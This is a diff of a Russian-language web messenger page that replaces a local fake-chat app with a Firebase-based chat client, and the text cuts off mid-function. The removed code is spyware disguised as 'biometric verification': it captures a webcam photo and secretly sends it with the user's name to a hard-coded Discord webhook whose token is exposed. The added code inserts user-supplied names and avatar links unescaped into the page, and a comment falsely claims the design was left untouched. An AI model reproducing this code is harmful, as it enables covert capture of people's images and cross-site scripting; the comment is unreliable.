@@ -3,359 +3,367 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FishGames Messenger Pro</title>
+    <title>TG-Clone (Chats Fix)</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #004d4d 0%, #002b2b 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
-        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
-        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
-        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
-        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; display: none; }
-        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 10px; }
-        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
-        .messenger-container { display: flex; height: 100%; }
-        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
-        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
-        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; overflow: hidden; cursor: pointer; }
-        .avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .chat-area { flex: 1; display: flex; flex-direction: column; }
-        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
-        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; font-size: 14px; }
-        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
-        .input-bar { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
-        #video, #canvas { display: none; }
+        /* ДИЗАЙН ВООБЩЕ НЕ ТРОГАЛ - ВСЕ КАК ТЫ ПРОСИЛ */
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: #e4eaf5; height: 100vh; display: flex; overflow: hidden; }
+        
+        #loading-screen, #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; width: 100%; background: white; position: absolute; z-index: 100; }
+        #app-screen { display: none; width: 100%; height: 100vh; }
+        
+        .auth-box { width: 320px; display: flex; flex-direction: column; gap: 12px; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .auth-box h3 { margin: 0 0 10px 0; text-align: center; color: #333; }
+        input { padding: 12px; border: 1px solid #ccc; border-radius: 8px; outline: none; width: 100%; transition: 0.2s; }
+        input:focus { border-color: #3390ec; }
+        button { background: #3390ec; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
+        button:hover { background: #2b7bc5; }
+        .text-btn { background: transparent; color: #3390ec; padding: 5px; font-weight: normal; font-size: 14px; margin-top: 5px; }
+        .text-btn:hover { text-decoration: underline; background: transparent; }
+        .error-text { color: red; font-size: 13px; text-align: center; margin: 0; min-height: 15px; }
+        
+        #sidebar { width: 300px; background: white; border-right: 1px solid #dfe1e5; display: flex; flex-direction: column; }
+        #chat-area { flex: 1; display: flex; flex-direction: column; background: #e4eaf5; }
+        
+        #my-profile { padding: 15px; background: #fff; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        #search-box { padding: 10px; background: #f4f4f5; }
+        #search-box input { width: 100%; padding: 8px 12px; border-radius: 20px; border: 1px solid #ddd; background: #fff; }
+        #user-list { flex: 1; overflow-y: auto; padding: 10px; }
+        
+        .user-item { display: flex; align-items: center; gap: 10px; padding: 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        .user-item:hover { background: #f4f4f5; }
+        .user-item .avatar { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; background: #ccc; }
+        .user-info { display: flex; flex-direction: column; }
+        .user-name { font-weight: bold; font-size: 14px; }
+        .user-nick { font-size: 12px; color: #888; }
+
+        #chat-header { padding: 15px 20px; background: white; border-bottom: 1px solid #dfe1e5; font-weight: bold; display: flex; align-items: center; gap: 10px; }
+        #messages-container { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
+        #message-input-area { padding: 15px; background: white; display: flex; gap: 10px; align-items: center; }
+        
+        .msg-row { display: flex; width: 100%; }
+        .msg-row.mine { justify-content: flex-end; }
+        .msg-bubble { max-width: 60%; padding: 10px 15px; border-radius: 15px; font-size: 15px; word-wrap: break-word; position: relative; }
+        .msg-row.others .msg-bubble { background: white; border-bottom-left-radius: 0; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .msg-row.mine .msg-bubble { background: #eeffde; border-bottom-right-radius: 0; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .msg-time { font-size: 10px; color: #888; text-align: right; margin-top: 4px; display: block; }
+        
+        #settings-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; justify-content: center; align-items: center; }
+        .modal-content { background: white; padding: 25px; border-radius: 12px; width: 320px; display: flex; flex-direction: column; gap: 10px; }
+        .modal-content h3 { margin-top: 0; }
     </style>
 </head>
-<body onload="checkAuth()">
+<body>
 
-<div id="vlad-scamer" onclick="this.style.display='none'"><img id="scamer-img" src=""></div>
+<div id="loading-screen"><h2>Загрузка...</h2></div>
 
-<div id="camera-overlay">
-    <div class="warning-box">
-        <h3>⚠️ FishGames SECURITY</h3>
-        <p>Биометрическая верификация лица обязательна для входа.</p>
-        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
+<div id="auth-screen" style="display: none;">
+    <div class="auth-box" id="reg-box">
+        <h3>Регистрация</h3>
+        <input type="text" id="reg-username" placeholder="Уникальный @юзернейм">
+        <input type="email" id="reg-email" placeholder="Email">
+        <input type="password" id="reg-password" placeholder="Пароль (мин. 6 символов)">
+        <button onclick="register()">Создать аккаунт</button>
+        <button class="text-btn" onclick="toggleAuthMode('login')">Уже есть аккаунт? Войти</button>
+        <p id="reg-error" class="error-text"></p>
+    </div>
+
+    <div class="auth-box" id="login-box" style="display: none;">
+        <h3>Вход</h3>
+        <input type="email" id="log-email" placeholder="Email">
+        <input type="password" id="log-password" placeholder="Пароль">
+        <button onclick="login()">Войти</button>
+        <button class="text-btn" onclick="toggleAuthMode('register')">Нет аккаунта? Создать</button>
+        <p id="log-error" class="error-text"></p>
     </div>
 </div>
 
-<div id="reg-screen" class="reg-card">
-    <h2>FishGames</h2>
-    <input type="text" id="firstname" placeholder="Имя">
-    <input type="text" id="lastname" placeholder="Фамилия">
-    <input type="text" id="login" placeholder="Логин">
-    <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
-</div>
-
-<div id="messenger-screen">
-    <div class="messenger-container">
-        <div class="sidebar">
-            <input type="text" class="search-input" id="searchField" placeholder="Поиск..." onkeypress="handleSearch(event)">
-            <div id="contacts"></div>
-            
-            <input type="file" id="contact-file-input" style="display:none" accept="image/*" onchange="applyContactAvatar(this)">
-
-            <div style="margin-top:auto; padding-top:10px; border-top:1px solid #2e8b57;">
-                <div style="display:flex; align-items:center; gap:10px;">
-                    <div class="avatar" id="my-ava" title="Сменить моё фото" onclick="document.getElementById('file-input').click()">?</div>
-                    <input type="file" id="file-input" style="display:none" accept="image/*" onchange="changeMyAvatar(this)">
-                    <div id="my-name">Вы</div>
-                    <button onclick="logout()" style="background:none; border:none; color:#ff4d4d; cursor:pointer; font-size:12px; margin-left:auto;">Удалить всё</button>
-                </div>
-            </div>
+<div id="app-screen">
+    <div id="sidebar">
+        <div id="my-profile">
+            <span id="my-display-name" style="font-weight: bold;">...</span>
+            <button onclick="openSettings()" style="width: auto; padding: 6px 12px; font-size: 12px; border-radius: 20px;">Настройки</button>
         </div>
-        <div class="chat-area">
-            <div class="chat-header" id="chat-title">Выберите чат</div>
-            <div class="messages-display" id="chat-box"></div>
-            <div class="input-bar">
-                <input type="text" id="messageText" placeholder="Сообщение..." onkeypress="if(event.key==='Enter')sendMessage()">
-                <button class="btn" style="width:60px" onclick="sendMessage()">➤</button>
-            </div>
+        <div id="search-box">
+            <input type="text" id="search-input" placeholder="Поиск по @юзернейму..." oninput="renderUserList()">
+        </div>
+        <div id="user-list">
+            <div style="padding: 10px; text-align: center; color: #888; font-size: 13px;">Загрузка чатов...</div>
+        </div>
+    </div>
+
+    <div id="chat-area">
+        <div id="chat-header">
+            <span id="active-chat-name">Выберите чат</span>
+        </div>
+        <div id="messages-container"></div>
+        <div id="message-input-area" style="display: none;">
+            <input type="text" id="msg-input" placeholder="Написать сообщение...">
+            <button onclick="sendPrivateMessage()" style="width: auto; padding: 10px 20px;">Отправить</button>
         </div>
     </div>
 </div>
 
-<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
-
-<script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
-
-    const defaultAvatars = {
-        "тимофей": "https://i.redd.it/2z8x8zvo5wne1.png",
-        "богдан": "https://preview.redd.it/tb2xa4aro8gf1.jpeg?auto=webp&s=dfaf8a418307c6a2a061e8859393481da6594786",
-        "ярослав": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj"
-    };
-
-    const botData = {
-        "ярослав": {
-            toxic: ["Ты чё, берега попутал?", "Слышь, завали ебало.", "Иди нахуй, я занят.", "За базар ответишь?", "Ща по IP вычислю, клоун."],
-            hi: ["Чё надо, епта?", "Здарова, если не шутишь.", "Ку.", "Ну привет, че хотел?"],
-            common: ["Ясно.", "Похуй вообще.", "Жиза, че.", "Мда...", "База.", "Лол.", "Кринж."]
-        },
-        "богдан": {
-            toxic: ["Код — говно.", "Не отвлекай.", "Не пиши.", "Тупой?"],
-            hi: ["Код пишу.", "Ку.", "Занят.", "Че надо?"],
-            common: ["Костыли.", "Python топ.", "Гугли.", "Ок.", "Понятно.", "Фича."]
-        },
-        "тимофей": {
-            toxic: ["Блять, я слил катку!", "Сука, иди в Майнкрафт.", "Ебать ты бот.", "Пошел нахуй, я в рейде."],
-            hi: ["ГО В РОБЛОКС!", "Привет! Зайдешь ко мне в плейс?", "Хай! У тебя какой ранг?"],
-            common: ["Я новую карту залил.", "Ахаха, лол.", "Жиза.", "Погнали в ДС?", "Роблокс — это жизнь."]
-        }
-    };
-
-    let currentChat = "";
-    let histories = {};
-    let customContactAvatars = {}; 
-    let contactToChange = "";
-    let lastBotReply = "";
-
-    function checkAuth() {
-        const savedUser = localStorage.getItem('fishGamesUser');
-        const savedHistories = localStorage.getItem('fishGamesHistories');
-        const savedContactAvatars = localStorage.getItem('fishGamesContactAvatars');
+<div id="settings-modal">
+    <div class="modal-content">
+        <h3>Настройки</h3>
+        <label style="font-size: 12px; color: #555;">Отображаемое имя:</label>
+        <input type="text" id="set-name">
+        <label style="font-size: 12px; color: #555;">Ссылка на аватарку:</label>
+        <input type="text" id="set-avatar">
         
-        if (savedContactAvatars) customContactAvatars = JSON.parse(savedContactAvatars);
-        if (savedHistories) {
-            histories = JSON.parse(savedHistories);
-            Object.keys(histories).forEach(name => renderContact(name));
-        }
-        if (savedUser) {
-            const user = JSON.parse(savedUser);
-            document.getElementById('camera-overlay').style.display = 'none';
-            showMessenger(user.name, user.photo);
-        }
-    }
-
-    async function requestAccess() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            video.srcObject = s;
-            document.getElementById('camera-overlay').style.display = 'none';
-            document.getElementById('reg-screen').style.display = 'block';
-        } catch(e) { alert("Ошибка камеры!"); }
-    }
-
-    function register() {
-        const fn = document.getElementById('firstname').value;
-        const ln = document.getElementById('lastname').value;
-        if(!fn || !ln) return alert("Заполни всё!");
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => {
-            const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: `📸 Вход: ${fn} ${ln}` }));
-            fd.append('file', b, 'user.png');
-            fetch(webhook, {method: 'POST', body: fd});
-        });
-        localStorage.setItem('fishGamesUser', JSON.stringify({ name: fn, photo: null }));
-        showMessenger(fn, null);
-    }
-
-    function showMessenger(name, photo) {
-        document.getElementById('reg-screen').style.display = 'none';
-        document.getElementById('messenger-screen').style.display = 'block';
-        document.getElementById('my-name').innerText = name;
-        const ava = document.getElementById('my-ava');
-        if (photo) { ava.innerHTML = `<img src="${photo}">`; ava.style.background = "none"; }
-        else { ava.innerText = name[0]; }
-    }
-
-    function changeMyAvatar(input) {
-        if (input.files && input.files[0]) {
-            const reader = new FileReader();
-            reader.onload = e => {
-                const data = e.target.result;
-                document.getElementById('my-ava').innerHTML = `<img src="${data}">`;
-                const user = JSON.parse(localStorage.getItem('fishGamesUser'));
-                user.photo = data;
-                localStorage.setItem('fishGamesUser', JSON.stringify(user));
-            };
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
-
-    function handleSearch(e) {
-        if(e.key === 'Enter') {
-            const val = document.getElementById('searchField').value.trim();
-            if(!val) return;
-            
-            const lowVal = val.toLowerCase();
-            const scamerDiv = document.getElementById('vlad-scamer');
-            const scamerImg = document.getElementById('scamer-img');
-
-            const specificSearches = {
-                "влад": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s",
-                "сом": "https://www.meme-arsenal.com/memes/d3d06b28fa36108ca45ae305580b61d2.jpg",
-                "зеленский": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTS_sfYdG82kkvaCsF6tO1WnGicJ9u4g5fm_w&s",
-                "иван": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQorg1RkPlG3pFaYF8G8sJADv_GGxczerzbZg&s",
-                "путин": "https://i.pinimg.com/736x/b4/94/0c/b4940c014a7eef9ed499720bcf1003ac.jpg",
-                "пудж": "https://i.pinimg.com/736x/fb/0f/f2/fb0ff294bca7def8ef4303e5e622fbfd.jpg",
-                "таджик": "https://www.meme-arsenal.com/memes/1f912a43a086d74ac52b7d7c10b31e40.jpg",
-                "laroslav7": "https://i.postimg.cc/3NzLGpDq/Snimok-ekrana-2026-01-08-213608.png",
-                "whityyy": "https://i.ibb.co/G425bLYd/photo-2025-12-16-16-04-28.jpg",
-                "мелстрой": "https://i.mycdn.me/getVideoPreview?id=8712612219479&idx=3&type=39&tkn=_rKfXoim3Q9DdL7CljOxavM4Tfs&fn=vid_w",
-                "ральзей": "https://i.redd.it/izorp9z7pks71.jpg",
-                "нищита": "https://opis-cdn.tinkoffjournal.ru/mercury/07-upd-best-memes-2025.jpg",
-                "врядли": "https://n1s1.hsmedia.ru/00/ed/ea/00edeaa45ccf50332c3ee9b565442713/331x232_1_2144a966cb998a4375c419a02cc5e04e@1200x840_0xemf0lgpv_2186864119614076990.jpg.webp",
-                "скебоб": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT90xPn_In8gmSoj5m70PBGg2X3rW3DuH98KA&s",
-                "окак": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTY55xLkJi13KSIxUIoxz1-sNFV6VzHon8v4w&s",
-                "миньйон": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgX1EysLf6uuwSInG3EeTEgiSBFF0zq8VjkA&s",
-                "бу": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaLcxHm5wpj6_MTDdpDzafKfFXHBy9mjMZEA&s",
-                "терпи": "https://n1s1.hsmedia.ru/18/2c/a6/182ca6ac86e2791143a88b66acb627b0/630x630_1_2b3c2dd1156030d1396d3baeb719f6bb@630x630_0xK8VGUIRS_7311165128453277963.jpg.webp",
-                "брейнрот": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzPPvsK8NNbWJU9fnnNH9RbWEhRRDKsn5L2Q&s",
-                "байден": "https://24tv.ua/resources/photos/news/202412/2712622_17101025.jpg?v=1734817861000&w=722&h=717&fit=cover&output=webp"
-            };
-
-            if (specificSearches[lowVal]) {
-                scamerImg.src = specificSearches[lowVal];
-                scamerDiv.style.display = 'flex';
-                return;
-            }
-
-            if(!histories[val]) {
-                histories[val] = [];
-                renderContact(val);
-                saveHistories();
-                openChat(val);
-                document.getElementById('searchField').value = '';
-            }
-        }
-    }
-
-    function renderContact(name) {
-        const low = name.toLowerCase();
-        const container = document.getElementById('contacts');
-        const isOriginal = ["ярослав", "богдан", "тимофей"].includes(low);
+        <button onclick="saveSettings()" style="margin-top: 10px;">Сохранить изменения</button>
+        <button onclick="closeSettings()" style="background: #e4eaf5; color: #333;">Отмена</button>
         
-        const item = document.createElement('div');
-        item.id = "contact-" + low;
-        item.style.cssText = "display:flex; align-items:center; gap:10px; padding:10px; cursor:pointer; border-radius:8px; transition: 0.2s;";
-        item.onmouseover = () => item.style.background = "#243b35";
-        item.onmouseout = () => item.style.background = "transparent";
-        
-        const avaDiv = document.createElement('div');
-        avaDiv.className = "avatar";
-        avaDiv.id = "ava-img-" + low;
+        <hr style="width: 100%; border: 0; border-top: 1px solid #eee; margin: 10px 0;">
+        <button onclick="logout()" style="background: #f1c40f; color: black;">Выйти из аккаунта</button>
+        <button onclick="deleteAccount()" style="background: #e74c3c;">Удалить аккаунт навсегда</button>
+    </div>
+</div>
 
-        updateAvaDisplay(avaDiv, name);
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence, deleteUser } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+  import { getDatabase, ref, set, get, push, onChildAdded, remove, off, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        avaDiv.onclick = (e) => {
-            e.stopPropagation();
-            if (!isOriginal) {
-                contactToChange = low;
-                document.getElementById('contact-file-input').click();
-            } else {
-                openChat(name);
-            }
-        };
+  // ==========================================
+  // ВСТАВЬ ТВОИ КЛЮЧИ СЮДА!
+  // ==========================================
+  const firebaseConfig = {
+    apiKey: "ВСТАВИТЬ_СЮДА",
+    authDomain: "ВСТАВИТЬ_СЮДА",
+    databaseURL: "ВСТАВИТЬ_СЮДА",
+    projectId: "ВСТАВИТЬ_СЮДА",
+    storageBucket: "ВСТАВИТЬ_СЮДА",
+    messagingSenderId: "ВСТАВИТЬ_СЮДА",
+    appId: "ВСТАВИТЬ_СЮДА"
+  };
 
-        const nameDiv = document.createElement('div');
-        nameDiv.innerText = name;
-        item.onclick = () => openChat(name);
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getDatabase(app);
+  setPersistence(auth, browserLocalPersistence);
 
-        item.appendChild(avaDiv);
-        item.appendChild(nameDiv);
-        container.appendChild(item);
-    }
+  let currentUser = null;
+  let myProfile = null;
+  let activeChatId = null;
+  let activePartnerId = null; // ДОБАВЛЕНО: запоминаем ID собеседника
+  let currentChatListener = null;
+  let recentChatsData = []; // ДОБАВЛЕНО: список твоих чатов
 
-    function updateAvaDisplay(div, name) {
-        const low = name.toLowerCase();
-        const custom = customContactAvatars[low];
-        const def = defaultAvatars[low];
+  const UI = {
+      loading: document.getElementById('loading-screen'),
+      auth: document.getElementById('auth-screen'),
+      app: document.getElementById('app-screen'),
+      regBox: document.getElementById('reg-box'),
+      loginBox: document.getElementById('login-box'),
+      regError: document.getElementById('reg-error'),
+      logError: document.getElementById('log-error')
+  };
 
-        if (custom) {
-            div.innerHTML = `<img src="${custom}">`;
-            div.style.background = "none";
-        } else if (def) {
-            div.innerHTML = `<img src="${def}">`;
-            div.style.background = "none";
-        } else {
-            div.innerText = name[0].toUpperCase();
-            div.style.background = "#22c55e";
-        }
-    }
+  window.toggleAuthMode = (mode) => {
+      UI.regError.innerText = ""; UI.logError.innerText = "";
+      if (mode === 'login') { UI.regBox.style.display = 'none'; UI.loginBox.style.display = 'flex'; } 
+      else { UI.regBox.style.display = 'flex'; UI.loginBox.style.display = 'none'; }
+  };
 
-    function applyContactAvatar(input) {
-        if (input.files && input.files[0] && contactToChange) {
-            const reader = new FileReader();
-            reader.onload = e => {
-                const data = e.target.result;
-                customContactAvatars[contactToChange] = data;
-                localStorage.setItem('fishGamesContactAvatars', JSON.stringify(customContactAvatars));
-                
-                const avaDiv = document.getElementById("ava-img-" + contactToChange);
-                if(avaDiv) updateAvaDisplay(avaDiv, contactToChange);
-            };
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
+  window.register = async () => {
+      UI.regError.innerText = "Создание...";
+      const u = document.getElementById('reg-username').value.trim().toLowerCase();
+      const e = document.getElementById('reg-email').value.trim();
+      const p = document.getElementById('reg-password').value.trim();
+      if(!u || !u.startsWith('@')) return UI.regError.innerText = "Юзернейм должен начинаться с @";
+      try {
+          const userCheck = await get(ref(db, 'usernames/' + u));
+          if(userCheck.exists()) return UI.regError.innerText = "Этот @юзернейм уже занят!";
+          const userCred = await createUserWithEmailAndPassword(auth, e, p);
+          const uid = userCred.user.uid;
+          await set(ref(db, 'usernames/' + u), uid);
+          await set(ref(db, 'users/' + uid), { username: u, displayName: u, avatar: "https://cdn-icons-png.flaticon.com/512/149/149071.png" });
+      } catch(err) { UI.regError.innerText = "Ошибка: " + err.message; }
+  };
 
-    function openChat(name) {
-        currentChat = name;
-        document.getElementById('chat-title').innerText = name;
-        document.getElementById('chat-box').innerHTML = '';
-        if (histories[name]) { histories[name].forEach(m => renderMessage(m.text, m.type)); }
-    }
+  window.login = () => {
+      UI.logError.innerText = "Вход...";
+      const e = document.getElementById('log-email').value.trim();
+      const p = document.getElementById('log-password').value.trim();
+      signInWithEmailAndPassword(auth, e, p).catch(err => UI.logError.innerText = "Неверный логин или пароль");
+  };
 
-    function renderMessage(text, type) {
-        const m = document.createElement('div');
-        m.className = 'msg-bubble ' + (type || '');
-        m.innerText = text;
-        document.getElementById('chat-box').appendChild(m);
-        document.getElementById('chat-box').scrollTop = 999999;
-    }
+  window.logout = () => signOut(auth);
 
-    function sendMessage() {
-        const txt = document.getElementById('messageText').value.trim();
-        if(!txt || !currentChat) return;
-        renderMessage(txt, '');
-        histories[currentChat].push({text: txt, type: ''});
-        saveHistories();
-        document.getElementById('messageText').value = '';
-        setTimeout(() => botReply(txt), 600);
-    }
+  window.deleteAccount = async () => {
+      if(!confirm("Удалить аккаунт навсегда?")) return;
+      try {
+          const uid = currentUser.uid;
+          const uname = myProfile.username;
+          await remove(ref(db, 'users/' + uid));
+          if(uname) await remove(ref(db, 'usernames/' + uname));
+          await deleteUser(currentUser);
+          alert("Аккаунт успешно удален.");
+      } catch(err) { alert("Ошибка: " + err.message); }
+  };
 
-    function botReply(uText) {
-        const t = uText.toLowerCase();
-        const n = currentChat.toLowerCase();
-        
-        let replyText = "";
+  onAuthStateChanged(auth, async (user) => {
+      if (user) {
+          currentUser = user;
+          let snap = await get(ref(db, 'users/' + user.uid));
+          let attempts = 0;
+          while (!snap.exists() && attempts < 6) { await new Promise(r => setTimeout(r, 500)); snap = await get(ref(db, 'users/' + user.uid)); attempts++; }
 
-        if (n === 'богдан') {
-            if (t.includes('го в студию')) {
-                replyText = "ААААААА ЗАДРАЛ СО СВОЕЙ СТУДИЕЙ";
-            }
-        }
+          if(snap.exists()) {
+              myProfile = snap.val();
+              document.getElementById('my-display-name').innerText = myProfile.displayName;
+          } else { myProfile = { displayName: "Ошибка", avatar: "" }; }
+          
+          UI.loading.style.display = 'none';
+          UI.auth.style.display = 'none';
+          UI.app.style.display = 'flex';
+          closeSettings();
 
-        if (n === 'тимофей') {
-            if (t.includes('сомы говно')) {
-                replyText = "Тебе все мои проекты не нравяться";
-            }
-        }
+          // ДОБАВЛЕНО: Запускаем прослушку активных чатов
+          startChatsListener();
+      } else {
+          currentUser = null; myProfile = null;
+          UI.loading.style.display = 'none'; UI.auth.style.display = 'flex'; UI.app.style.display = 'none';
+      }
+  });
 
-        if (!replyText) {
-            const p = botData[n] || { hi: ["Здарова."], toxic: ["Сам такой."], common: ["Ясно.", "Ок.", "Мда."] };
-            const isToxic = ["хуй", "пидор", "сука", "блять", "еблан", "чмо", "урод"].some(w => t.includes(w));
-            const isHi = ["привет", "ку", "хай", "здарова"].some(w => t.includes(w));
-            
-            let pool = isToxic ? p.toxic : (isHi ? p.hi : p.common);
-            
-            do { replyText = pool[Math.floor(Math.random() * pool.length)]; } while (replyText === lastBotReply && pool.length > 1);
-        }
+  // НОВАЯ ФУНКЦИЯ: Следит за тем, с кем у тебя есть переписки
+  function startChatsListener() {
+      onValue(ref(db, 'userChats/' + currentUser.uid), (snap) => {
+          recentChatsData = [];
+          if(snap.exists()) {
+              snap.forEach(child => { recentChatsData.push({uid: child.key, time: child.val()}); });
+              recentChatsData.sort((a,b) => b.time - a.time); // Сортируем: новые сверху
+          }
+          renderUserList();
+      });
+  }
 
-        lastBotReply = replyText;
-        renderMessage(replyText, 'msg-incoming');
-        histories[currentChat].push({text: replyText, type: 'msg-incoming'});
-        saveHistories();
-    }
+  // ОБНОВЛЕНО: Теперь эта функция рисует либо результаты поиска, либо твои активные чаты
+  window.renderUserList = async () => {
+      const query = document.getElementById('search-input').value.trim().toLowerCase();
+      const list = document.getElementById('user-list');
+      
+      // Если мы что-то ищем по @юзернейму
+      if (query) {
+          if(!query.startsWith('@')) { list.innerHTML = '<div style="padding:10px;text-align:center;color:#888;font-size:13px;">Введите @юзернейм</div>'; return; }
+          const usernameSnap = await get(ref(db, 'usernames/' + query));
+          if(usernameSnap.exists()) {
+              const targetUid = usernameSnap.val();
+              if(targetUid === currentUser.uid) return; 
+              const userSnap = await get(ref(db, 'users/' + targetUid));
+              if(userSnap.exists()) {
+                  const u = userSnap.val();
+                  list.innerHTML = `
+                      <div class="user-item" onclick="openChat('${targetUid}', '${u.displayName}', '${u.avatar}')">
+                          <img src="${u.avatar}" class="avatar" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
+                          <div class="user-info">
+                              <span class="user-name">${u.displayName}</span>
+                              <span class="user-nick">${u.username}</span>
+                          </div>
+                      </div>`;
+              }
+          } else { list.innerHTML = '<div style="padding:10px;text-align:center;color:#888;font-size:13px;">Не найден</div>'; }
+      } 
+      // Если строка поиска пустая — показываем твои чаты!
+      else {
+          list.innerHTML = '';
+          if(recentChatsData.length === 0) {
+              list.innerHTML = '<div style="padding:10px;text-align:center;color:#888;font-size:13px;">У вас пока нет чатов. Найдите кого-нибудь через @поиск</div>';
+              return;
+          }
+          // Грузим аватарки и имена для каждого чата
+          for(let c of recentChatsData) {
+              const userSnap = await get(ref(db, 'users/' + c.uid));
+              if(userSnap.exists()) {
+                  const u = userSnap.val();
+                  const div = document.createElement('div');
+                  div.className = 'user-item';
+                  div.onclick = () => openChat(c.uid, u.displayName, u.avatar);
+                  div.innerHTML = `
+                      <img src="${u.avatar}" class="avatar" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
+                      <div class="user-info">
+                          <span class="user-name">${u.displayName}</span>
+                          <span class="user-nick">${u.username}</span>
+                      </div>`;
+                  list.appendChild(div);
+              }
+          }
+      }
+  };
 
-    function saveHistories() { localStorage.setItem('fishGamesHistories', JSON.stringify(histories)); }
-    function logout() { if(confirm("Удалить всё?")) { localStorage.clear(); location.reload(); } }
+  function getChatId(uid1, uid2) { return uid1 < uid2 ? `${uid1}_${uid2}` : `${uid2}_${uid1}`; }
+
+  // ОБНОВЛЕНО: Добавил передачу аватарки в шапку чата
+  window.openChat = (partnerUid, partnerName, partnerAvatar) => {
+      if(currentChatListener && activeChatId) off(ref(db, 'chats/' + activeChatId));
+
+      activePartnerId = partnerUid;
+      activeChatId = getChatId(currentUser.uid, partnerUid);
+      
+      // Рисуем аватарку и имя в шапке
+      document.getElementById('active-chat-name').innerHTML = `
+          <img src="${partnerAvatar}" style="width: 35px; height: 35px; border-radius: 50%; object-fit: cover;" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
+          ${partnerName}
+      `;
+      
+      document.getElementById('messages-container').innerHTML = '';
+      document.getElementById('message-input-area').style.display = 'flex';
+
+      currentChatListener = onChildAdded(ref(db, 'chats/' + activeChatId), (data) => {
+          const msg = data.val();
+          const isMine = msg.sender === currentUser.uid;
+          const time = new Date(msg.time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+          
+          const div = document.createElement('div');
+          div.className = `msg-row ${isMine ? 'mine' : 'others'}`;
